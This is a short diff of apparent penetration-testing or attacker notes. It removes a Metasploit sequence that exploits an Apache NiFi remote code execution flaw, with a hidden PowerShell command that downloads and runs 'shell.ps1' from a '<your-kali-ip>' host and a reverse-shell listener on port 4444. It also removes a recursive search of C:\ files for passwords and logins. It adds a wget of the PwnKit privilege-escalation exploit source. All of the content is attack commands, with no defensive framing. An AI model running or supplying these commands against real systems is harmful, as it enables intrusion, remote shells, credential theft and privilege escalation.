@@ -1,11 +1,1 @@
-use exploit/multi/http/apache_nifi_processor_rce
-set RHOSTS 192.1
-set RPORT 8080
-set TARGETURI /nifi
-set SSL false
-set CMD powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<your-kali-ip>/shell.ps1')"
-set LHOST <your-kali-ip>
-set LPORT 4444
-exploit
-
-Get-ChildItem -Recurse -Include *.xml,*.config,*.ini,*.txt -Path C:\ | Select-String -Pattern "password", "user", "login"
+wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O pwnkit.c
